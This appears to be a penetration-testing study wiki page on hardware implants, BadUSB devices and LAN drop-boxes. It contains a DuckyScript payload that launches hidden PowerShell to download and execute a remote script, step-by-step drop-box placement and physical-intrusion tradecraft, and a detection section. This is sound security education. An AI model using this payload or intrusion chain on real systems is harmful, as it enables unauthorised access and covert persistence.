---
title: Hardware implants and BadUSB
slug: hardware-implants-and-badusb
aliases: [badusb, hardware-implants, hak5]
---

{% raw %}

> **TL;DR:** A "hardware implant" is a device that, once plugged in or planted, gives the attacker access to a network or system. BadUSB devices imitate keyboards, send pre-scripted keystrokes, and run payloads. Network implants (LAN Turtle, Packet Squirrel) sit between a host and the network. Implant tradecraft is part physical access, part payload engineering. Companion to [[physical-pentest-tradecraft]] and [[client-side-attacks-primer]].

## The implant taxonomy

| Class | Examples | Capabilities |
|---|---|---|
| **HID injection** | USB Rubber Ducky, Bash Bunny, Digispark, Malduino | emulate keyboard, type at machine speed |
| **HID + storage + ethernet** | Bash Bunny | + appear as USB ethernet for staging |
| **In-line keylogger** | KeyGrabber, KeyCarbon | passive keystroke capture |
| **LAN implants** | Hak5 LAN Turtle, Packet Squirrel | sit between host & switch, run scripted tools |
| **Network drops** | Pwnix RasPi, Mini-PC with 4G | full Kali on the wire, beaconing out |
| **Pwned KVM / IPMI** | depends on platform | management-plane persistence |
| **Custom SoC** | ESP32 attacker boards | BLE / WiFi pivots |

## BadUSB primer

A "BadUSB" device claims to be a HID keyboard. Operating systems accept new HID devices unconditionally (this is by design — recovery from a broken keyboard). The implant then types whatever the attacker scripted.

Typical Rubber Ducky payload (DuckyScript):

```text
DELAY 1000
GUI r                    # Win+R
DELAY 500
STRING powershell -nop -w hidden -ep bypass -c "IEX(IWR http://10.10.14.5/p.ps1 -UseBasicParsing)"
ENTER
```

Lands a stager in under 5 seconds.

## Bash Bunny — multi-mode

Mode 1: HID keyboard (like Rubber Ducky).
Mode 2: USB Ethernet — Windows auto-installs the driver; attacker becomes the host's default gateway.
Mode 3: USB Mass Storage with autorun-style tricks (limited; most OSs ignore autorun.inf now).

Switch position selects payload. Use cases: credential harvest via "QuickCreds" payload (USB ethernet + Responder for NetNTLM hashes).

## Tradecraft considerations

| Decision | Effect |
|---|---|
| Disguise (USB drive, charging cable) | physical believability |
| Payload trigger | autorun on insert vs button press |
| Persistence on host | type once or persist via Run key |
| Egress | beacon, USB ethernet, none |
| Forensic residue | dropped files vs in-memory only |

OSEP-relevant flow: USB implant → AMSI-patched stager → process injection → C2 → AD enumeration ([[osep-full-chain-walkthrough]]).

## Detection / defence

- **Group Policy / endpoint DLP** — block "new HID" installation unless an admin approves.
- **Microsoft Defender for Endpoint Device Control** — block by USB device class / VID:PID.
- **Sysmon EventID 1** — `powershell.exe` spawned by `explorer.exe` shortly after device-add is suspicious.
- **PhyTunnel / USBGuard on Linux** — allowlists USB devices.
- **Physical port lockdown** — epoxy USB ports, only Smart Card readers allowed.
- **Smart Card / FIDO2 for auth** — eliminates value of HID-injected keystrokes that try to dump passwords.

## LAN implant tradecraft

Implant sits between the host and the switch. Use cases:
- Sniff unencrypted traffic.
- LLMNR / NBT-NS / mDNS poisoning ([[password-spraying]]+responder).
- Reach the host's IP via a back-channel modem.
- Egress via 4G modem to attacker C2.

Hak5 LAN Turtle / Packet Squirrel ship Linux + script slots. Mini-PC with Kali gives full toolkit.

## Drop-box methodology

1. **Reconnaissance** — locate poorly-monitored switch ports (under desks, conference rooms, printer rooms).
2. **Pretext** — IT staff, vendor, network upgrade.
3. **Placement** — between target host and wall jack, or behind printer.
4. **Cabling** — flat passthrough cables hide; bright USB connectors don't.
5. **Power** — implant draws < 1W, plugs into a free USB charger or PoE adapter.
6. **Egress** — usually outbound 443/HTTPS via 4G; backup DNS over 53.
7. **Persistence** — implant beacons every N minutes; reverse shell on call.

## Physical OPSEC

- Sterile clothing (no logos identifying you).
- Burner phone for any in-the-moment contact.
- Memorise the layout; don't print maps.
- Wipe implant after the engagement.
- Be ready to abandon a planted device cleanly.

## Sample engagement chain

1. Tailgate into a target's office during morning rush.
2. In a quiet hallway, plug a Bash Bunny into a kiosk PC.
3. Bash Bunny's HID payload spawns PowerShell, beacons out to attacker C2.
4. Drop a LAN implant behind a conference-room ethernet jack.
5. Implant phones home over 4G; tunnel SSH to internal Kali.
6. From internal Kali, pivot via the C2-shell into AD.
7. Exit cleanly. Recover devices at end of engagement.

## OSEP relevance

OSEP tests assumed-breach assuming a workstation foothold. Hardware implants are the *cause* of that foothold in many real engagements. The exam doesn't test physical, but the supply-chain understanding is part of the operator's mental model.

## Tools

- **Hak5 ecosystem** — Rubber Ducky, Bash Bunny, LAN Turtle, Packet Squirrel, OMG cable.
- **Pwn Plug**, **Pwnix RasPi**, **TinyCheck** — niche / DIY.
- **Flipper Zero** — combines BadUSB, NFC/RFID ([[nfc-and-rfid-cloning]]), and other RF in one device.
- **O.MG Cable** — a USB cable that's a BadUSB.

## References
- [Hak5 documentation](https://docs.hak5.org/)
- [Ducky Script reference](https://docs.hak5.org/hak5-usb-rubber-ducky/payload-development)
- [USBGuard](https://github.com/USBGuard/usbguard)
- [MalDuino](https://maltronics.com/products/malduino-w)
- See also: [[physical-pentest-tradecraft]], [[client-side-attacks-primer]], [[osep-full-chain-walkthrough]], [[nfc-and-rfid-cloning]]

{% endraw %}
